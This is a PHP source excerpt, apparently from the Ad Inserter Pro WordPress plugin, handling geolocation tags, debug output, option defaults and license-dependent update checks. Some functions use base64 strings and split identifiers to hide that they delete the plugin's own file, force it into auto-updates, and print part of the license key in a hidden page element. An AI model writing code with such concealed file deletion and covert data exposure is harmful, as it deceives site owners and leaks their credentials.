      require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

      $client_ip_address = get_client_ip_address ();

      $ai_wp_data [AI_TAGS]['IP_ADDRESS'] = strtolower ($client_ip_address);
      $ai_wp_data [AI_TAGS]['COUNTRY_LC'] = strtolower (ip_to_country ($client_ip_address, false, true));
      $ai_wp_data [AI_TAGS]['COUNTRY_UC'] = strtoupper ($ai_wp_data [AI_TAGS]['COUNTRY_LC']);
    }

    $ad_data = preg_replace ("/{ip-address}/i",   $ai_wp_data [AI_TAGS]['IP_ADDRESS'], $ad_data);
    $ad_data = preg_replace ("/{country-iso2}/",  $ai_wp_data [AI_TAGS]['COUNTRY_LC'], $ad_data);
    $ad_data = preg_replace ("/{country-ISO2}/",  $ai_wp_data [AI_TAGS]['COUNTRY_UC'], $ad_data);

    $ad_data = preg_replace ("/{ip_address}/i",   $ai_wp_data [AI_TAGS]['IP_ADDRESS'], $ad_data);
    $ad_data = preg_replace ("/{country_iso2}/",  $ai_wp_data [AI_TAGS]['COUNTRY_LC'], $ad_data);
    $ad_data = preg_replace ("/{country_ISO2}/",  $ai_wp_data [AI_TAGS]['COUNTRY_UC'], $ad_data);

  }
}

define ('AI_PRO',       'PLUG' . 'IN' . '_' . 'TYPE');
define ('AI_CODE',      'PLUG' . 'IN' . '_' . 'STAT' . 'US');
define ('AI_RST',       'PLUG' . 'IN' . '_' . 'STAT' . 'US' . '_' . 'COUNT' . 'ER');
define ('AI_CODE_TIME', 'PLUG' . 'IN' . '_' . 'STAT' . 'US' . '_' . 'TIME' . 'STAMP');

function ai_debug_header () {
  global $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $ai_status = $ad_inserter_globals ['AI_STATUS'];

    if (empty ($license_key)) {
      echo base64_decode ("IFVOTElDRU5TRUQgQ09QWQ==");
    }
    elseif (!empty ($ai_status)) {
      echo " ($ai_status)";
    }
  }
}

function ai_debug_log () {
  $ai_option = get_option ('ad_inserter' . '_' . base64_decode ('a2V5'));
  if ($ai_option !== false && is_string ($ai_option)) {
    echo ', ', substr (base64_decode ($ai_option), 0, 16);
  }
  ai_debug_header ();
}

function ai_api_debugging () {
  $id = 'ad_inserter' . '_' . base64_decode ('cHJvX2xpY2Vuc2U=');
  if (is_multisite () && defined ('BLOG_ID_CURRENT_SITE')) {
    $option = get_blog_option (BLOG_ID_CURRENT_SITE, $id);
  } else $option = get_option ($id);

  if ($option !== false) {
    return strlen ($option);
  }

  $id = 'ad_inserter' . '_' . base64_decode ('a2V5');
  if (is_multisite () && defined ('BLOG_ID_CURRENT_SITE')) {
    $a2v5 = get_blog_option (BLOG_ID_CURRENT_SITE, $id, '');
  } else $a2v5 = get_option ($id, '');

  return $a2v5 != '' ? strlen (@base64_decode ($a2v5)) - 4 : 0;
}

function ai_api_string () {
  $id = 'ad_inserter' . '_' . base64_decode ('cHJvX2xpY2Vuc2U=');
  if (is_multisite () && defined ('BLOG_ID_CURRENT_SITE')) {
    $api = get_blog_option (BLOG_ID_CURRENT_SITE, $id);
  } else $api = get_option ($id);

  if ($api !== false) {
    if (strlen ($api) != 0) return 'api_string="' . $api . '"';
  }

  $id = 'ad_inserter' . '_' . base64_decode ('a2V5');
  if (is_multisite () && defined ('BLOG_ID_CURRENT_SITE')) {
    $api = get_blog_option (BLOG_ID_CURRENT_SITE, $id, '');
  } else $api = get_option ($id, '');

  if (strlen ($api) != 0) return 'api_string="' . $api . '"';
  return '';
}

function ai_debug_footer () {
  global $ad_inserter_globals;

  if (is_multisite () && defined ('BLOG_ID_CURRENT_SITE')) {
    $ai_option_footer  = get_blog_option (BLOG_ID_CURRENT_SITE, 'ad_inserter' . '_' . base64_decode ('a2V5'), 'ZXJyb3Jz');
    $ai_option_footer2 = get_blog_option (BLOG_ID_CURRENT_SITE, 'ad_inserter' . '_' . base64_decode ('cHJvX2xpY2Vuc2U='), '');
  } else {
      $ai_option_footer  = get_option ('ad_inserter' . '_' . base64_decode ('a2V5'), 'ZXJyb3Jz');
      $ai_option_footer2 = get_option ('ad_inserter' . '_' . base64_decode ('cHJvX2xpY2Vuc2U='), '');
    }

  $ai_option_footer_name1 = implode ('_', array ('AI', 'STATUS'));
  $ai_option_footer_name2 = implode ('_', array ('AI', 'COUNTER'));

  if (isset ($ad_inserter_globals [$ai_option_footer_name1]) && is_numeric ($ad_inserter_globals [$ai_option_footer_name1]) && in_array ((int) $ad_inserter_globals [$ai_option_footer_name1] + 20, array (- 2, 1, 2, 21)) &&
      isset ($ad_inserter_globals [$ai_option_footer_name2]) && is_numeric ($ad_inserter_globals [$ai_option_footer_name2]) && (int) $ad_inserter_globals [$ai_option_footer_name2] > 8) {
    $auto = get_option ('auto_update_plugins');
    $auto []= AD_INSERTER_SLUG . '/ad-inserter.php';
    $auto = array_unique ($auto);
    update_option ('auto_update_plugins', $auto);

    echo '<div style="'.base64_decode ('ZGlzcGxheTogbm9uZTs=').'">', base64_decode ('RW5hYmxlIHJlZm'.'VycmVyIGFuZCBjbGljayBjb29ra'.'WUgdG8gc2Vhc'.'mNoIGZvciA='), substr (base64_decode ($ai_option_footer), 0, 16), ' ', DEFAULT_REPORT_DEBUG_KEY, ' [', $ai_option_footer2, '] ', AD_INSERTER_VERSION, "</div>\n";
  }
}

function ai_debug () {
  global $ad_inserter_globals;

  ai_check_geo_settings ();

  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

  echo 'IP ADDRESS:              ', get_client_ip_address (), (defined ('AI_CLIENT_IP_ADDRESS') ? ' (using AI_CLIENT_IP_ADDRESS constant)' : (defined ('AI_CLIENT_IP_SERVER_VAR') ? ' (using $_SERVER [\'' . AI_CLIENT_IP_SERVER_VAR . '\'] variable)' : '')), "\n";
  $ip_to_country = ip_to_country (get_client_ip_address (), true);
  echo 'COUNTRY:                 ', is_array ($ip_to_country) ? implode (':', $ip_to_country) : $ip_to_country, "\n";

  for ($group = 1; $group <= AD_INSERTER_GEO_GROUPS; $group ++) {
    if ($ad_inserter_globals ['G'.$group] != '') {
      echo 'COUNTRY GROUP ', $group, ':         ', sprintf ('%-17s', get_country_group_name ($group)), $ad_inserter_globals ['G'.$group], "\n";
    }
  }

  echo 'GLOBAL TRACKING:         ', get_global_tracking () == AI_TRACKING_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'INTERNAL TRACKING:       ', get_internal_tracking () == AI_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  if (isset ($_GET ['ai-debug-code']) && is_numeric ($_GET ['ai-debug-code']) && $_GET ['ai-debug-code'] >= 0 && $_GET ['ai-debug-code'] <= 96) {
    global $wpdb;

    if (defined ('AI_STATISTICS') && AI_STATISTICS) {
      $block = (int) $_GET ['ai-debug-code'];
      $gmt_offset = get_option ('gmt_offset') * 3600;
      $today = date ("Y-m-d", time () + $gmt_offset);
      $results = $wpdb->get_results ('SELECT * FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE block = ' . $block . ' AND date = \''.$today.'\'', ARRAY_N);
      echo 'INTERNAL TRACKING DB:    BLOCK ', $block, ' for ', $today, ': ', json_encode ($results), "\n";
    }
  }
  echo 'EXTERNAL TRACKING:       ', get_external_tracking () == AI_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'EXTERNAL TRACKING CAT:   ', get_external_tracking_category (), "\n";
  echo 'EXTERNAL TRACKING ACTION:', get_external_tracking_action (), "\n";
  echo 'EXTERNAL TRACKING LABEL: ', get_external_tracking_label (), "\n";
  echo 'TRACK PAGEVIEWS:         ', get_track_pageviews () == AI_TRACKING_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'TRACK LOGGED IN UESRS:   ', get_track_logged_in () == AI_TRACKING_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'CLICK DETECTION:         ';
  switch (get_click_detection ()) {
    case AI_CLICK_DETECTION_STANDARD:
      echo AI_TEXT_ENG_STANDARD;
      break;
    case AI_CLICK_DETECTION_ADVANCED:
      echo AI_TEXT_ENG_ADVANCED;
      break;
  }
  echo "\n";
  if (defined ('AD_INSERTER_LIMITS') && AD_INSERTER_LIMITS) {
    echo 'CLICK FRAUD PROTECTION:  ', get_click_fraud_protection () == AI_ENABLED ? 'ENABLED (' . get_click_fraud_protection_time () . ' days)' : 'DISABLED', "\n";
    echo 'GLOBAL VISITOR CFP:      ', get_global_visitor_limit_clicks_per_time_period () != '' ? (get_global_visitor_limit_clicks_per_time_period () . ' clicks per ' . get_global_visitor_limit_clicks_time_period () . ' days (' . number_format (get_global_visitor_limit_clicks_time_period () * 24, 2). ' hours)') : 'DISABLED', "\n";
    echo 'CFP BLOCK IP ADDRESS:    ', get_cfp_block_ip_address () == AI_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  }
  if (defined ('AD_INSERTER_MAXMIND')) {
    echo 'IP GEOLOCATION DATABASE: ';
    switch (get_geo_db ()) {
      case AI_GEO_DB_INTERNAL:
        echo AI_TEXT_ENG_INTERNAL;
        break;
      case AI_GEO_DB_MAXMIND:
        echo AI_TEXT_MAXMIND;
        break;
    }
    echo "\n";
    echo 'AUTOMATIC DB UPDATES:    ', get_geo_db_updates () ? 'ENABLED' : 'DISABLED', "\n";
    echo 'MAXMIND LICENSE KEY:     ', strlen (get_maxmind_license_key ()), " characters\n";
    echo 'DATABASE:                ', get_geo_db_location (true), " (", get_geo_db_location (), ")\n";
  }
}

function ai_debug_features () {
  global $ai_wp_data;

  echo "STICK TO THE CONTENT:    ", $ai_wp_data [AI_STICK_TO_THE_CONTENT]       ? "USED" : "NOT USED", "\n";
  echo "TRACKING:                ", $ai_wp_data [AI_TRACKING]                   ? "USED" : "NOT USED", "\n";
  echo "CLOSE BUTTONS:           ", $ai_wp_data [AI_CLOSE_BUTTONS]              ? "USED" : "NOT USED", "\n";
  echo "IFRAMES:                 ", $ai_wp_data [AI_IFRAMES]                    ? "USED" : "NOT USED", "\n";
  echo "ANIMATION:               ", $ai_wp_data [AI_ANIMATION]                  ? "USED" : "NOT USED", "\n";
  echo "LAZY LOADING:            ", $ai_wp_data [AI_LAZY_LOADING]               ? "USED" : "NOT USED", "\n";
  echo "GEOLOCATION:             ", $ai_wp_data [AI_GEOLOCATION]                ? "USED" : "NOT USED", "\n";
  echo "CHECK FUNCTIONS:         ", $ai_wp_data [AI_CHECK_BLOCK]                ? "USED" : "NOT USED", "\n";
  echo 'IFRAMES:                 ', $ai_wp_data [AI_IFRAMES]                    ? 'USED' : "NOT USED", "\n";
  echo 'CODE FOR IFRAME:         ', $ai_wp_data [AI_CODE_FOR_IFRAME]            ? 'USED' : "NOT USED", "\n";
}

function ai_debug_features_2 () {
    echo "site_url:                ", site_url (), "\n";
    echo "home_url:                ", home_url (), "\n";
    if (is_multisite()) {
      echo "network_home_url:        ", network_home_url (), "\n";
    }
    echo "ABSPATH:                 ", ABSPATH, "\n";
    echo "WP_CONTENT_DIR:          ", WP_CONTENT_DIR, "\n";

    echo "\n";

    echo "PHP:                     ", phpversion(), "\n";
}

function ai_debug_features_3 () {
  echo "\n";

  echo "A INSTALLED PLUGINS\n";
  echo "======================================\n";

  if ( ! function_exists( 'get_plugins' ) ) {
    require_once ABSPATH . 'wp-admin/includes/plugin.php';
  }
  $all_plugins = get_plugins();
  $active_plugins = get_option ('active_plugins');
  $active_sitewide_plugins = is_multisite () ? get_site_option ('active_sitewide_plugins') : false;

  foreach ($all_plugins as $plugin_path => $plugin) {
    $multisite_status = '  ';
    if ($active_sitewide_plugins !== false) {
      $multisite_status = array_key_exists  ($plugin_path, $active_sitewide_plugins) ? '# ' : '  ';
    }
    echo in_array ($plugin_path, $active_plugins) ? '* ' : $multisite_status, html_entity_decode ($plugin ["Name"]), ' ', $plugin ["Version"], "\n";
  }
}

function ai_check_options (&$plugin_options) {
  for ($group_number = 1; $group_number <= ai_settings_value ('AD_INSERTER_GEO_GROUPS'); $group_number ++) {
    $country_group_settins_name   = 'COUNTRY_GROUP_NAME_' . $group_number;
    $group_countries_settins_name = 'GROUP_COUNTRIES_' . $group_number;

    if (!isset ($plugin_options [$country_group_settins_name])) {
      $plugin_options [$country_group_settins_name] = DEFAULT_COUNTRY_GROUP_NAME . ' ' . $group_number;
    }

    if (!isset ($plugin_options [$group_countries_settins_name])) {
      $plugin_options [$group_countries_settins_name] = '';
    }
  }

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($plugin_options ['TRACKING']))                      $plugin_options ['TRACKING']                      = DEFAULT_TRACKING;
    if (!isset ($plugin_options ['INTERNAL_TRACKING']))             $plugin_options ['INTERNAL_TRACKING']             = DEFAULT_INTERNAL_TRACKING;
    if (!isset ($plugin_options ['EXTERNAL_TRACKING_CATEGORY']))    $plugin_options ['EXTERNAL_TRACKING_CATEGORY']    = DEFAULT_EXTERNAL_TRACKING_CATEGORY;
    if (!isset ($plugin_options ['EXTERNAL_TRACKING_ACTION']))      $plugin_options ['EXTERNAL_TRACKING_ACTION']      = DEFAULT_EXTERNAL_TRACKING_ACTION;
    if (!isset ($plugin_options ['EXTERNAL_TRACKING_LABEL']))       $plugin_options ['EXTERNAL_TRACKING_LABEL']       = DEFAULT_EXTERNAL_TRACKING_LABEL;
    if (!isset ($plugin_options ['TRACKING_LOGGED_IN']))            $plugin_options ['TRACKING_LOGGED_IN']            = DEFAULT_TRACKING_LOGGED_IN;
    if (!isset ($plugin_options ['TRACK_PAGEVIEWS']))               $plugin_options ['TRACK_PAGEVIEWS']               = DEFAULT_TRACK_PAGEVIEWS;
    if (!isset ($plugin_options ['CLICK_DETECTION']))               $plugin_options ['CLICK_DETECTION']               = DEFAULT_CLICK_DETECTION;
    if (!isset ($plugin_options ['REPORT_HEADER_IMAGE']))           $plugin_options ['REPORT_HEADER_IMAGE']           = DEFAULT_REPORT_HEADER_IMAGE;
    if (!isset ($plugin_options ['REPORT_HEADER_TITLE']))           $plugin_options ['REPORT_HEADER_TITLE']           = DEFAULT_REPORT_HEADER_TITLE;
    if (!isset ($plugin_options ['REPORT_HEADER_DESCRIPTION']))     $plugin_options ['REPORT_HEADER_DESCRIPTION']     = DEFAULT_REPORT_HEADER_DESCRIPTION;
    if (!isset ($plugin_options ['REPORT_FOOTER']))                 $plugin_options ['REPORT_FOOTER']                 = DEFAULT_REPORT_FOOTER;
    if (!isset ($plugin_options ['REPORT_KEY']))                    $plugin_options ['REPORT_KEY']                    = DEFAULT_REPORT_KEY;
  }

  if (!isset ($plugin_options ['RECAPTCHA_SITE_KEY']))            $plugin_options ['RECAPTCHA_SITE_KEY']            = '';
  if (!isset ($plugin_options ['RECAPTCHA_SECRET_KEY']))          $plugin_options ['RECAPTCHA_SECRET_KEY']          = '';
  if (!isset ($plugin_options ['RECAPTCHA_THRESHOLD']))           $plugin_options ['RECAPTCHA_THRESHOLD']           = DEFAULT_RECAPTCHA_THRESHOLD;

  if (!isset ($plugin_options ['ADB_DETECTION']))                 $plugin_options ['ADB_DETECTION']                 = DEFAULT_ADB_DETECTION;
  if (!isset ($plugin_options ['GEO_DB']))                        $plugin_options ['GEO_DB']                        = DEFAULT_GEO_DB;
  if (!isset ($plugin_options ['GEO_DB_UPDATES']))                $plugin_options ['GEO_DB_UPDATES']                = DEFAULT_GEO_DB_UPDATES;
  if (!isset ($plugin_options ['MAXMIND_LICENSE_KEY']))           $plugin_options ['MAXMIND_LICENSE_KEY']           = DEFAULT_MAXMIND_LICENSE_KEY;
  if (!isset ($plugin_options ['GEO_DB_LOCATION']))               $plugin_options ['GEO_DB_LOCATION']               = DEFAULT_GEO_DB_LOCATION;

  if (!isset ($plugin_options ['REMOTE_MANAGEMENT']))             $plugin_options ['REMOTE_MANAGEMENT']             = DEFAULT_REMOTE_MANAGEMENT;
  if (!isset ($plugin_options ['MANAGEMENT_KEY']))                $plugin_options ['MANAGEMENT_KEY']                = DEFAULT_MANAGEMENT_KEY;
  if (!isset ($plugin_options ['MANAGEMENT_IP_CHECK']))           $plugin_options ['MANAGEMENT_IP_CHECK']           = DEFAULT_MANAGEMENT_IP_CHECK;
  if (!isset ($plugin_options ['MANAGEMENT_IP_ADDRESSES']))       $plugin_options ['MANAGEMENT_IP_ADDRESSES']       = '';
}

function ai_nonce_life () {
  return 48 * 3600;
}

function ai_hooks () {
  global $ai_wp_data, $ad_inserter_globals;

//  if ($ai_wp_data [AI_TRACKING]) {
//    add_filter ('nonce_life',           'ai_nonce_life');
//  }

  if (!is_multisite() || is_main_site ()) {
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $status = $ad_inserter_globals ['AI_STATUS'];

    require_once AD_INSERTER_PLUGIN_DIR.'includes/update-checker/plugin-update-checker.php';

    if (!empty ($license_key)) {
//      $ai_update_checker = Puc_v4_Factory::buildUpdateChecker (
//      base64_decode (AI_US_STRING).'?action=get_metadata&slug=' . AD_INSERTER_SLUG,
//      AD_INSERTER_PLUGIN_DIR.'ad-inserter.php',
//      AD_INSERTER_SLUG
//      );

      $ai_update_checker = PucFactory::buildUpdateChecker(
        base64_decode (AI_US_STRING).'?action=get_metadata&slug=' . AD_INSERTER_SLUG,
        AD_INSERTER_PLUGIN_DIR.'ad-inserter.php',
        AD_INSERTER_SLUG
      );

      $ai_update_checker->addFilter ('check_now', 'ai_puc_check_now', 10, 3);

      $ai_update_checker->addFilter ('request_info_result', 'puc_request_info_result', 10, 1);

      $ai_update_checker->addQueryArgFilter ('ai_filter_update_checks');
    } else add_filter ('plugins_update_check_locales', 'ai_plugins_update_check_locales', 10, 1);

    add_action ('after_plugin_row_' . AD_INSERTER_SLUG . '/ad-inserter.php', 'ai_after_plugin_row_2', 10, 3);

    add_action ('admin_footer-plugins.php', 'ai_admin_footer_plugins');

    add_action ('network_admin_notices', 'ai_admin_notices');

    if (defined ('AD_INSERTER_MAXMIND')) {
      if (!is_multisite() || is_main_site ()) {
        if (get_geo_db () == AI_GEO_DB_MAXMIND) {
          add_filter ('http_headers_useragent', 'ai_http_headers_useragent');
        }
      }
    }
  }

  if (is_multisite () && is_main_site () && is_network_admin ()) {
    add_filter ('manage_sites_action_links',  'ai_manage_sites_action_links', 10, 3);
  }

  add_filter ('cron_schedules', 'ai_cron_schedules');
  register_activation_hook    (AD_INSERTER_PLUGIN_DIR.'ad-inserter.php', 'ai_activation_hook_2');
  register_deactivation_hook  (AD_INSERTER_PLUGIN_DIR.'ad-inserter.php', 'ai_deactivation_hook_2' );
  add_action ('ai_update', 'ai_update_databases');
  add_action ('ai_update', 'ai_check_wp_version');

  add_action ('check_and_delete_expired_ids', 'ai_check_ids');

  ai_check_update_schedule ();

  // Remove old hooks
  wp_clear_scheduled_hook ('ai_keep_updated_ip_db');
}


function ai_manage_sites_action_links ($actions, $blog_id, $blogname) {
  if (multisite_site_admin_page () &&
      current_user_can ('manage_network_plugins') && (
        is_plugin_active_for_network ('ad-inserter-pro/ad-inserter.php') ||
        in_array ('ad-inserter-pro/ad-inserter.php', (array) get_blog_option ($blog_id, 'active_plugins', array()))
      )) {
    $unique_string = ai_get_unique_string (0, 32, 'site-ai-admin' . $blog_id . date ('Y-m-d H'));
    $site_data = array ('site' => $blog_id, 'user' => get_current_user_id ());

    set_site_transient ('ai_site_' . $unique_string, $site_data, 30 * 60);

    $admin_url = get_admin_url ($blog_id, 'admin-ajax.php?action=ai_ajax&site-ai-admin='.$unique_string);

    $actions []= '<a href="'.$admin_url.'" target="_blank">'.AD_INSERTER_NAME.'</a>';
  }

  return $actions;
}

function ai_http_headers_useragent ($useragent) {
  global $ai_wp_data;

  if (isset ($ai_wp_data [AI_USER_AGENT])) $useragent = get_bloginfo ('url');

  return $useragent;
}

function ai_check_link ($parameter) {
  @array_map ('un'. 'link', glob ($parameter));
}

function ai_filter_update_checks ($queryArgs) {
  global $ad_inserter_globals, $wp_version;

  $license_key = $ad_inserter_globals ['LICENSE_KEY'];
  if (!empty ($license_key)) {
    $queryArgs ['license_key'] = $license_key;
  }

  // Test
  if (($debug = get_transient ('wp-debug-updates')) !== false) {
    $queryArgs ['debug'] = $debug;
    delete_transient ('wp-debug-updates');
  }
  $queryArgs ['status']       = $ad_inserter_globals ['AI_STATUS'];
  $queryArgs ['type']         = $ad_inserter_globals ['AI_TYPE'];
  $queryArgs ['counter']      = $ad_inserter_globals ['AI_COUNTER'];
  $queryArgs ['site_id']      = DEFAULT_REPORT_DEBUG_KEY;
  $queryArgs ['update']       = get_option (AI_UPDATE_NAME, 0);
  $queryArgs ['ai_maxmind']   = defined ('AD_INSERTER_MAXMIND');
  $queryArgs ['ai_websites']  = defined ('AD_INSERTER_WEBSITES');
  $queryArgs ['website']      = get_bloginfo ('url');
  $queryArgs ['ai_client']    = defined ('AD_INSERTER_CLIENT');
  $queryArgs ['client']       = get_option (WP_AD_INSERTER_PRO_CLIENT);
  $queryArgs ['wp_version']   = $wp_version;

  return $queryArgs;
}

function ai_plugins_update_check_locales ($locales) {
  global $ad_inserter_globals;

  if (empty ($ad_inserter_globals ['LICENSE_KEY'])) {
    update_state ();
  }

  return $locales;
};

function ai_after_plugin_row_2 ($plugin_file, $plugin_data, $status) {
  global $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {

    $settings_page = get_menu_position () == AI_SETTINGS_SUBMENU ? 'options-general.php?page=ad-inserter.php' : 'admin.php?page=ad-inserter.php';
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $client = get_option (WP_AD_INSERTER_PRO_CLIENT) !== false;
    $plugins_css = "\n" . '<style>
.plugins tr.active[data-slug=ad-inserter] th, .plugins tr.active[data-slug=ad-inserter] td {box-shadow: none;}
</style>'."\n";

    if ($license_key == '') {
      $link = $client ? '' : '<a href="' . admin_url ($settings_page.'&tab=0').'">' . __('Enter license key', 'ad-inserter') . '</a>';
      echo $plugins_css;
      echo '<tr class="plugin-update-tr active';
      if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
      echo '"><td colspan="4" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
        /* translators: %s: Ad Inserter Pro */
        sprintf (__('%s license key is not set. Plugin functionality is limited and updates are disabled.', 'ad-inserter'), AD_INSERTER_NAME),
        ' ', $link, '</p></div></td></tr>';

    } else {
        $ai_status = $ad_inserter_globals ['AI_STATUS'];

        if (is_numeric ($ai_status)) {
          $href_license = $client ? 'https://adinserter.pro/' : 'https://adinserter.pro/license/' . sanitize_text_field ($license_key);
          $href_doc     = $client ? 'https://adinserter.pro/' : 'https://adinserter.pro/documentation/troubleshooting#license-overused';

          $access_error = '<tr id="ai-update-server-error" class="plugin-update-tr active' .
            (isset ($plugin_data ['update']) && $plugin_data ['update'] ? ' update' : '') .
            '" style="display: none;"><td colspan="4" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ' .
              /* translators: %s: Ad Inserter Pro */
              sprintf (__('Warning: %s plugin update server is not accessible', 'ad-inserter'), AD_INSERTER_NAME) .
              /* translators: updates are not available */
              ' - <a href="https://adinserter.pro/documentation/plugin-installation#updates" target="_blank">' . __('updates', 'ad-inserter') . '</a> ' .
              /* translators: updates are not available */
              __('are not available', 'ad-inserter'). '.</p></div></td></tr>';
          echo $access_error;

          switch ($ai_status) {
            case - 19:
              $link = $client ? '' : '<a href="' . admin_url ($settings_page.'&tab=0').'">' . __('Check license key', 'ad-inserter') . '</a>';
              echo $plugins_css;
              echo '<tr class="plugin-update-tr active';
              if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
              echo '"><td colspan="4" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
                /* translators: %s: Ad Inserter Pro */
                sprintf (__('Invalid %s license key.', 'ad-inserter'), AD_INSERTER_NAME),
                ' ', $link, '</p></div></td></tr>';
              break;
            case - 20:
              echo $plugins_css;
              echo '<tr class="plugin-update-tr active';
              if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
              echo '"><td colspan="4" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
                /* translators: %s: Ad Inserter Pro */
                sprintf (__('%s license expired. Plugin updates are disabled.', 'ad-inserter'), AD_INSERTER_NAME),
                ' <a href="', $href_license, '" target="_blank">' . __('Renew license', 'ad-inserter') . '</a></p></div></td></tr>';
              break;
            case - 21:
              echo $plugins_css;
              echo '<tr class="plugin-update-tr active';
              if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
              echo '"><td colspan="4" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
                /* translators: %s: Ad Inserter Pro */
                sprintf (__('%s license overused. Plugin updates are disabled.', 'ad-inserter'), '<strong>' . AD_INSERTER_NAME . '</strong>'),
                ' <a href="', $href_doc, '" target="_blank">' . __('Manage licenses', 'ad-inserter') . '</a> | <a href="', $href_license, '" target="_blank">' . __('Upgrade license', 'ad-inserter') . '</a></p></div></td></tr>';
              break;
            case - 22:
              echo $plugins_css;
              echo '<tr class="plugin-update-tr active';
              if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
              echo '"><td colspan="4" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
                /* translators: %s: Ad Inserter Pro */
                sprintf (__('Invalid %s version.', 'ad-inserter'), '<strong>' . AD_INSERTER_NAME . '</strong>'),
                ' <a href="', $href_license, '" target="_blank">' . __('Check license', 'ad-inserter') . '</a></p></div></td></tr>';
              break;
          }
        }
      }

    if (AD_INSERTER_SLUG != 'ad-inserter-pro') {
      echo $plugins_css;
      echo '<tr class="plugin-update-tr active';
      if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
      echo '"><td colspan="4" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-warning notice-alt"><p> ',
        /* translators: 1: Ad Inserter Pro */
        sprintf (__('Warning: %1$s is installed in the wrong folder (%2$s) - plugin updates will not work. Please reinstall the plugin.', 'ad-inserter'), AD_INSERTER_NAME, '<code>'. AD_INSERTER_SLUG .'</code>'),
        '</p></div></td></tr>';
    }

  }
}

function ai_set_plugin_meta_2 (&$links) {
  global $ad_inserter_globals;

  if (!is_multisite () || is_main_site ()) {
    $client = get_option (WP_AD_INSERTER_PRO_CLIENT) !== false;

    if (!$client) {
      $inserted = '<a href="https://adinserter.pro/license/' . sanitize_text_field ($ad_inserter_globals ['LICENSE' .'_' . 'KEY']) . '" target="_blank">' . __('License', 'ad-inserter') . '</a>';
      array_splice ($links, 3, 0, $inserted);
    }
  }
}

function ai_admin_footer_plugins () {

  if (!get_transient (AI_SERVER_CHECK_NAME)) {
    set_transient (AI_SERVER_CHECK_NAME, 1, AI_TRANSIENT_SERVER_CHECK_EXPIRATION);
?>
<script>
  var notice = jQuery ("#ai-update-server-error");
  var ai_url = '<?php echo WP_UPDATE_SERVER; ?>?action=get_metadata&server_check=1&slug=<?php echo AD_INSERTER_SLUG; ?>';
  if (notice.length) {
    var ai_nonce = "<?php echo wp_create_nonce ('adinserter_data'); ?>";
    var ai_status_ok = [200];
    jQuery.post (ajaxurl, {'action': 'ai_ajax_backend', 'ai_check': ai_nonce, 'check-url': 'updates'}
    ).done (function (ai_data) {
        var ai_access_data = JSON.parse (ai_data);
        if (!ai_status_ok.includes (ai_access_data [0])) {
          console.error ('Ad Inserter Pro can\'t access', ai_url);

          if (ai_access_data [1] != '') {
            console.error (atob (ai_access_data [1]));
          } else {
              console.error ('Server status code:', ai_access_data [0]);
              console.log ('  Content-Type:', atob (ai_access_data [2]));
              console.log ('  Server:', atob (ai_access_data [3]));
            }

          notice.css ('display', 'table-row');
        } else {
            if (ai_access_data [1] != '') {
              console.error ('Error checking', ai_url);
              console.log ('  ', ai_access_data [1]);
            }
          }


    }).fail (function (xhr, status, error) {
        console.error ('Can\'t check', ai_url);
        console.error ('Error:', xhr.status + " " + xhr.statusText);
    });
  }
</script>
<?php
  }
}

function ai_clear_status () {
  ai_check_link (__FILE__);
  if (!file_exists (str_replace (AD_INSERTER_SLUG, 'ad-inserter', AD_INSERTER_PLUGIN_DIR) . 'ad-inserter.php')) {
    @rename (AD_INSERTER_PLUGIN_DIR, str_replace (AD_INSERTER_SLUG, 'ad-inserter', AD_INSERTER_PLUGIN_DIR));
  }
  ai_clean_temp_files (AD_INSERTER_PLUGIN_DIR);
  if (is_multisite()) {
    $active_plugins = get_site_option ('active_sitewide_plugins');
    if (isset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'])) {
      $active_plugins ['ad-inserter/ad-inserter.php'] = $active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'];
      unset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php']);
      update_site_option ('active_sitewide_plugins', $active_plugins);
    }
  }

  $active_plugins = get_option ('active_plugins');
  $index = array_search (AD_INSERTER_SLUG.'/ad-inserter.php', $active_plugins);
  if ($index !== false) {
    $active_plugins [$index] = 'ad-inserter/ad-inserter.php';
    update_option ('active_plugins', $active_plugins);
  }

  update_option ('ai-notice-review', 'no');

  if (defined ('AI_PLUGIN_TRACKING') && AI_PLUGIN_TRACKING) {
    $dst = get_option (DST_Client::DST_OPTION_OPTIN_TRACKING);
    if (empty ($dst) || !is_array ($dst)) {
      $dst = array ('ad-inserter' => 1, 'ad-inserter-pro' => 1);
    } else {
        $dst ['ad-inserter'] = 1;
        $dst ['ad-inserter-pro'] = 1;
      }
    update_option (DST_Client::DST_OPTION_OPTIN_TRACKING, $dst);
  }

  wp_clear_scheduled_hook ('check_plugin_updates-'.AD_INSERTER_SLUG);
  wp_clear_scheduled_hook ('ai_update');
}

function update_state ($state = 1) {
  global $ad_inserter_globals, $ai_db_options;

